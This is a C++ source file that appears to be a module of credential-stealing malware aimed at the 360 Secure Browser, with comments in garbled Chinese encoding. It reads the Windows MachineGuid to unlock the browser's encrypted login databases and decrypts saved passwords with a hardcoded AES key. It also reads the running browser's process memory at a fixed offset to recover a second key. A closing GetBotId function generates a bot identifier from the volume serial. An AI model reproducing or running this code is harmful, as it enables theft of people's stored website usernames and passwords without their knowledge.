#include "stdafx.h"
#include "Get360seInfo.h"
#include <io.h>
#include <tchar.h>

using namespace std;
Get360seInfo::Get360seInfo()
{
	offset = 0x4C91B5;
	m_errCode = BROWSER_360_SUCCESS;

	isLogin = false;
	isOk = false;

	std::shared_ptr<BYTE> ptrGuid = MyGetRegValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", "MachineGuid");

	if (ptrGuid == nullptr)
	{
		m_errCode = BROWSER_360SE_GUID_GET_FAILED;
		return;
	}


	std::shared_ptr<BYTE> db360Path = MyGetRegValueA(HKEY_CLASSES_ROOT, "360SeSES\\DefaultIcon", "");

	if (db360Path == nullptr)
	{
		m_errCode = BROWSER_360SE_REG_PATH_FAILED;
		return;
	}


	// ��ȡ guid �Լ� db�ļ�·��
	m_ptrGuid = (char*)ptrGuid.get();
	m_ptr360dbPath = replaceALL((char*)db360Path.get(), "360se6\\Application\\360se.exe,0", "360se6\\User Data\\Default\\apps\\LoginAssis\\assis2.db)");

	if (m_ptr360dbPath.length() > 1 || m_ptrGuid.length() > 1)
	{
		isOk = true;
	}


	// Ѱ���Ƿ���ڵ�¼��db�ļ�
	std::string loginDB360Path = replaceALL((char*)db360Path.get(), "360se6\\Application\\360se.exe,0", "360se6\\User Data\\Default\\");

	// �������ܵ��û�db�ļ�λ��
	FindLoginDB(loginDB360Path);

	// �����д���db�ļ� ���ڵ�½��Ϣ
	if (db4ver.size() > 0)
	{
		isLogin = true;
	}

	m_str360seFullPath = replaceALL((char*)db360Path.get(), "360se6\\Application\\360se.exe,0", "360se6\\Application\\360se.exe");


}

Get360seInfo::~Get360seInfo()
{
}

bool Get360seInfo::getData(std::vector<BrowserData>* pBroData)
{
	// 360se���������δ�ҵ� ����false
	if (!isOk)return isOk;

	Open360Database(pBroData);

	if (isLogin)
	{
		OpenLogin360Data(pBroData);
	}

	return isOk;
}



bool Get360seInfo::Open360Database(std::vector<BrowserData>* pBroData)
{
	sqlite3* connection;
	if (sqlite3_open(m_ptr360dbPath.c_str(), &connection) != SQLITE_OK)
	{
		m_errCode = 0;//BROWSER_SQLITE_OPEN_FAILED;
		return false;
	}

#ifdef _DEBUG
	m_ptrGuid = "88ec4cb8-94cc-4d18-9052-75b79bcaab2c";
#endif 


	sqlite3_key(connection, m_ptrGuid.c_str(),int( m_ptrGuid.length()));

	LPCSTR query = "SELECT * FROM tb_account";
	sqlite3_stmt* result;
	if (sqlite3_prepare_v2(connection, query, -1, &result, 0) != SQLITE_OK)
	{
		m_errCode = 2;// BROWSER_SQLITE_PREPARE_FAILED;
		return false;
	}

	int columnCount = sqlite3_column_count(result);


	std::string id = (char*)sqlite3_column_name(result, 0);
	std::string domain = (char*)sqlite3_column_name(result, 1);
	std::string username = (char*)sqlite3_column_name(result, 2);
	std::string password = (char*)sqlite3_column_name(result, 3);
	std::string items = (char*)sqlite3_column_name(result, 4);
	std::string last_modify_time = (char*)sqlite3_column_name(result, 5);
	std::string reserved = (char*)sqlite3_column_name(result, 6);

	char key[] = "cf66fb58f5ca3485";

	while (sqlite3_step(result) != SQLITE_DONE)
	{
		BrowserData bdata;
		bdata.bro_name = "360";
		bdata.bro_url = (char*)sqlite3_column_text(result, 1);
		bdata.user_name = U2G((char*)sqlite3_column_text(result, 2)); // U2G ��������
		bdata.pass_word = Last360Uncode(
			DecryptAes(replaceALL((char*)sqlite3_column_text(result, 3), "(4B01F200ED01)", ""), key).c_str()
		);
		pBroData->push_back(bdata);
	}
	return true;
	//last_modify_time
}

std::string Get360seInfo::Last360Uncode(const char* passItem)
{
	std::string _stringb;
	if (passItem[0] == '\x02')
	{
		for (int p = 0; p < int(strlen(passItem)); p++)
		{
			if (p % 2 == 1)
			{
				_stringb += passItem[p];
			}
		}
	}
	else
	{
		for (int p = 1; p < int(strlen(passItem)); p++)
		{
			if (p % 2 != 1)
			{
				_stringb += passItem[p];
			}
		}
	}

	return _stringb;
}

/*----------------------------
 * ���� : �ݹ�����ļ��У��ҵ����а����������ļ�
 *----------------------------
 * ���� : find
 * ���� : public
 *
 * ���� : lpPath [in]      ��������ļ���Ŀ¼
 * ���� : fileList [in]    ���ļ����Ƶ���ʽ�洢��������ļ�
 */
void Get360seInfo::FindLoginDB(std::string lpPath)
{
	WIN32_FIND_DATAA FindFileData;

	std::string findPath = lpPath;
	findPath += "*";

	HANDLE hFind = ::FindFirstFileA(findPath.c_str(), &FindFileData);
	if (INVALID_HANDLE_VALUE == hFind)    return;


	while (true)
	{
		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (strlen(FindFileData.cFileName) == 32)
			{
				std::string dbpath = lpPath + FindFileData.cFileName;
				dbpath += "\\assis2.db";
				// �ļ��Ƿ����
				if (_access(dbpath.c_str(), 0) != 0)
				{
					break;
				}
				db4ver.push_back(dbpath);
			}

		}

		if (!FindNextFileA(hFind, &FindFileData))    break;
	}
	FindClose(hFind);
}


bool Get360seInfo::OpenLogin360Data(std::vector<BrowserData>* pBroData)
{
	//loginRandKey = "$n4Q99CJX^vgAIN0zm)U_lBF=!URk*WY";

	// �ж�360se�����Ƿ���ڻ�ȡ�����ڴ�
	if (!EnumProcessGetRandstr())
	{


		if (m_errCode == BROWSER_OFFSET_GET_NULL)
			return false;

		// ��Ҫ�������� ��ȡ�ڴ� ���Ƿ��մ����ﲻ����
		return false;
	}

	loginRandKey += "C6BEC8A5-348D-43d0-93D2-58BFD28077AF";
	char key[] = "cf66fb58f5ca3485";

	unsigned char sha256[33] = {};
	Calcsha256((unsigned char*)loginRandKey.c_str(), (unsigned int)loginRandKey.length(), sha256);
	unsigned char Md5[33] = {};
	CalcMd5(sha256, (unsigned int)strlen((const char*)sha256), Md5);

	char mdString[33] = {};
	for (int i = 0; i < 16; i++)
		sprintf_s(&mdString[i * 2], sizeof(mdString), "%02x", (unsigned int)Md5[i]);


	/*for (auto db4: db4ver)
	{*/
	for (vector<string>::iterator iter = db4ver.begin(); iter != db4ver.end(); iter++)
	{
		sqlite3* connection;
		if (sqlite3_open((*iter).c_str(), &connection) != SQLITE_OK)
		{
			m_errCode = BROWSER_360SE_SQLITE_OPEN_FAILED;//BROWSER_SQLITE_OPEN_FAILED;
			return false;
		}

#ifdef _DEBUG
		m_ptrGuid = "88ec4cb8-94cc-4d18-9052-75b79bcaab2c";
#endif 


		sqlite3_key(connection, m_ptrGuid.c_str(), int(m_ptrGuid.length()));

		LPCSTR query = "SELECT * FROM tb_account";
		sqlite3_stmt* result;
		if (sqlite3_prepare_v2(connection, query, -1, &result, 0) != SQLITE_OK)
		{
			m_errCode = BROWSER_360SE_SQLITE_PREPARE_FAILED;// BROWSER_SQLITE_PREPARE_FAILED;
			return false;
		}

		int columnCount = sqlite3_column_count(result);


		std::string id = (char*)sqlite3_column_name(result, 0);
		std::string domain = (char*)sqlite3_column_name(result, 1);
		std::string username = (char*)sqlite3_column_name(result, 2);
		std::string password = (char*)sqlite3_column_name(result, 3);
		std::string items = (char*)sqlite3_column_name(result, 4);
		std::string last_modify_time = (char*)sqlite3_column_name(result, 5);
		std::string reserved = (char*)sqlite3_column_name(result, 6);


		while (sqlite3_step(result) != SQLITE_DONE)
		{
			BrowserData bdata;
			bdata.bro_name = "360 safe";
			bdata.bro_url = (char*)sqlite3_column_text(result, 1);
			bdata.user_name = U2G((char*)sqlite3_column_text(result, 2)); // U2G ��������
			bdata.pass_word = Last360Uncode(
				DecryptAes(replaceALL((char*)sqlite3_column_text(result, 3), "(51637587F6BB463a92D17DD7903A1F6F)", ""), mdString).c_str()
			);

			bdata.pass_word = Last360Uncode(
				DecryptAes(replaceALL(bdata.pass_word.c_str(), "(4B01F200ED01)", ""), key).c_str()
			);

			pBroData->push_back(bdata);
		}
	}
	return true;
}



// ����chorme �ڴ��е� randstrλ��
bool Get360seInfo::EnumChromeRandstr(DWORD th32ProcessID, HANDLE h_360se)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, th32ProcessID);
	if (INVALID_HANDLE_VALUE == hSnapshot) { return false; }
	MODULEENTRY32 mi;
	mi.dwSize = sizeof(MODULEENTRY32);
	BOOL bRet = Module32First(hSnapshot, &mi);

	byte readtemp[40];

	SIZE_T dwNumberOfBytesRead;

	while (bRet)
	{

		if (_wcsicmp(mi.szModule, _T("chrome.dll")) == 0) {

			// ����ƫ�ƻ�ȡλ��
			int index = offset + (int)mi.modBaseAddr;
			// printf("%X ", index);

			memset(readtemp, 0, 40);
			ReadProcessMemory(h_360se, (LPCVOID)index, readtemp, 0x4, &dwNumberOfBytesRead);

			index = *(int*)readtemp;
			// printf("%X ", index);

			memset(readtemp, 0, 40);
			ReadProcessMemory(h_360se, (LPCVOID)index, readtemp, 0x4, &dwNumberOfBytesRead);

			if (*(int*)readtemp == 0) {
				m_errCode = BROWSER_OFFSET_GET_NULL;
				return false;
			}

			index = *(int*)readtemp;
			// printf("%X ", index);

			memset(readtemp, 0, 40);
			ReadProcessMemory(h_360se, (LPCVOID)index, readtemp, 0x20, &dwNumberOfBytesRead);

			// printf("%s ", readtemp);
			loginRandKey = (char*)readtemp;
			return true;
		}
		bRet = Module32Next(hSnapshot, &mi);
	}
	return false;
}



//�������н���
bool Get360seInfo::EnumProcessGetRandstr()
{
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);		// ���̿��վ��
	PROCESSENTRY32 process = { sizeof(PROCESSENTRY32) };							// ���ս�����Ϣ�Ķ���

	// ��������
	while (Process32Next(hProcessSnap, &process)) {

		// �ҵ���Ҫ�Ľ���
		if (_wcsicmp(process.szExeFile, _T("360se.exe")) == 0) {


			// ��ȡ���̾��
			HANDLE h_360se = OpenProcess(PROCESS_VM_READ, FALSE, process.th32ProcessID);

			if (!h_360se) {
				m_errCode = BROWSER_360SE_PROCOPEN_FAILED;
				return false;
			}


			// �����ý��̵��ڴ��
			if (EnumChromeRandstr(process.th32ProcessID, h_360se)) {
				return true;
			}

			CloseHandle(h_360se);
		}

	}

	// ����Ѿ���ƫ�Ʋ��Ҵ��� �����벻��
	// �������û�ҵ����� PROC NOT FIND
	m_errCode = m_errCode == BROWSER_OFFSET_GET_NULL ? BROWSER_OFFSET_GET_NULL : BROWSER_360SE_PROC_NOT_FIND;
	return false;

}



ULONG PseudoRand(ULONG* seed)
{
	return (*seed = 1352459 * (*seed) + 2529004207);
}

void GetBotId(char* botId)
{
	CHAR windowsDirectory[MAX_PATH * 4];
	CHAR volumeName[8] = { 0 };
	DWORD seed = 0;

	if (GetWindowsDirectoryA(windowsDirectory, sizeof(windowsDirectory)))
		windowsDirectory[0] = L'C';

	volumeName[0] = windowsDirectory[0];
	volumeName[1] = ':';
	volumeName[2] = '\\';
	volumeName[3] = '\0';

	GetVolumeInformationA(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);

	GUID guid;
	guid.Data1 = PseudoRand(&seed);

	guid.Data2 = (USHORT)PseudoRand(&seed);
	guid.Data3 = (USHORT)PseudoRand(&seed);
	for (int i = 0; i < 8; i++)
		guid.Data4[i] = (UCHAR)PseudoRand(&seed);

	wsprintfA(botId, (PCHAR)"%08lX%04lX%lu", guid.Data1, guid.Data3, *(ULONG*)&guid.Data4[2]);
}
